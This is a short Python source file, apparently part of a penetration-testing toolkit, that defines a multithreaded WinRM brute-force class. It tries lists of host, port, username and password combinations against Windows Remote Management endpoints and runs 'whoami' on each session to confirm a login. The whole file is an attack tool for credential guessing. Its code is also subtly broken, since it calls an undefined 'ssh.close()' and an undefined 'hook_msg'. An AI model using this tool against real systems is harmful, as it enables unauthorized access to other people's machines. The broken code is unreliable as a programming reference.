#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-12-26 14:00:25
@LastEditTime: 2019-12-26 14:59:59
'''

import winrm
from concurrent.futures import ThreadPoolExecutor

class WinrmBruteForce(object):
    """WinrmBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(WinrmBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout

    def worker(self,hpup):
        host,port,user,pwd = hpup
        try:
            s = winrm.Session("http://{}:{}/wsman".format(host,port),auth=(user,pwd))
            r = s.run_cmd("whoami")
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            hook_msg((True,host,port,user,pwd))
        finally:
            ssh.close()

    def run(self):
        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                f = executor.submit(self.worker,(host,port,user,pwd))
                # f.add_done_callback(call_back)


bruter = WinrmBruteForce

